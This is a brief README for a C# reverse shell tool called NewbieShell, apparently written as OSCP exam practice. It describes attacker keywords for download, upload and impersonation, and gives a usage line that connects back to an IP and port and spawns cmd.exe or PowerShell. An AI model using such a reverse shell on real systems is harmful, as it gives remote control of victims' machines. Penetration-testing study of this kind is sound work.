# NewbieShell
### Reverse shell for beginners

When preparing for the OSCP certificate. 
I have seen some reverse shell in action. The most annoying thing for me was that a very long text is needed when downloading and uploading. 
Because I like to program in C#, I thought to myself. I simplify this a bit. 
Through this idea, Newbie - Shell was born. With short keywords the attacker has the possibility to list downloads, uploads, impersonate. This simplifies a lot.

Newbieshell.exe [ip] [port] [cmd.exe or powershell.exe] \n
Example: NewbieShell.exe 192.168.0.1 80 cmd.exe
